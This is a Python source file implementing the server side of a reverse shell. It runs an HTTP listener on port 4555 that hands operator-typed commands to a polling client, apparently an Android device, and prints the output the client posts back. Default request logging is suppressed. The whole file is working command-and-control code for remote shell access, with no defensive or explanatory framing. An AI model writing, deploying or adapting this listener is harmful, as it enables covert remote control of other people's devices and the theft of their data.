from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

PORT = 4555
shared_data = {"command": None, "response": None}
client_connected = threading.Event()

class ReverseShellHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return  # suppress default logging

    def do_GET(self):
        client_ip = self.client_address[0]
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

        if not client_connected.is_set():
            print(f"[*] Client {client_ip} connected.")
            client_connected.set()

        if shared_data["command"]:
            self.wfile.write(shared_data["command"].encode())
            print(f"[→] Sent command: {shared_data['command']}")
            shared_data["command"] = None
        else:
            self.wfile.write(b"")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        response = self.rfile.read(content_length).decode()
        print(f"[←] Response: {response}")
        shared_data["response"] = response
        self.send_response(200)
        self.end_headers()

def command_loop():
    while True:
        cmd = input("Shell> ").strip()
        if cmd:
            shared_data["command"] = cmd
            # Wait for response
            while shared_data["command"] is not None:
                pass  # Wait until Android picks it up

def run():
    server = HTTPServer(('', PORT), ReverseShellHandler)
    print(f"[*] Starting server on port {PORT}...")
    threading.Thread(target=command_loop, daemon=True).start()
    server.serve_forever()

if __name__ == '__main__':
    run()
